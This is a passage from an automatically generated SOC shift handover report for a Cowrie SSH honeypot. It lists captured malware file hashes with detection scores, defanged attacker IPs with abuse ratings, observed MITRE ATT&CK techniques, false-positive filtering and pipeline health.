| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `120.241.117[.]94` | CN | China Mobile Communications Corporation | **100** ⚠️ | 1 |
| `120.48.147[.]81` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `113.141.171[.]139` | CN | CHINANET SHAANXI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `14.18.113[.]233` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `185.92.182[.]129` | US | as56971 network | **100** ⚠️ | 37 |
| `49.64.85[.]138` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `162.221.222[.]179` | US | Metronet | **100** ⚠️ | 14 |
| `120.48.123[.]76` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `45.196.236[.]141` | HK | Akile LTD | **100** ⚠️ | 50 |
| `101.126.64[.]76` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 204 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 103 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 27 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 13 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 244 cases |
| Tool 34  | Credential Extractor        | ✅ 130 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 36 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (5.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 27 priority case(s) shown individually · 22 recon entry/entries in table (8 group(s) consolidating 189 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-05T19:27:29Z_
